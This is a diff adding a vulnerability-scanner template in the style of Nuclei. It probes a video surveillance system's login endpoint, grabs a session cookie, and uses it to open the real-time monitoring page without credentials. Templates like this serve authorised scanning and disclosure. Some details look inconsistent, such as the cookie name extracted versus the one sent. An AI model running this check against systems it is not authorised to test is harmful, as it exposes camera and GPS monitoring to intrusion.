@@ -1,0 +1,44 @@
+id: poc-yaml-video-surveillance-system-failed-authentication
+info:
+  name: Video Surveillance System - Failed Authentication
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass
+
+http:
+  - id: "login"
+    method: GET
+    path:
+      - "{{BaseURL}}/mgrcter/usermgr/user/Login.action"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"success\":true,\"msg\":\"\"}"
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        regex:
+          - "SESSIONID=(.*?);"
+
+  - id: "realtime-monitor"
+    method: GET
+    path:
+      - "{{BaseURL}}/monitor/realt/init?curPageId=a1"
+    headers:
+      Cookie: JSESSIONID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>实时监控</title>"
+          - "<td align=\"right\" width=\"100\">GPS保存天数：</td>"
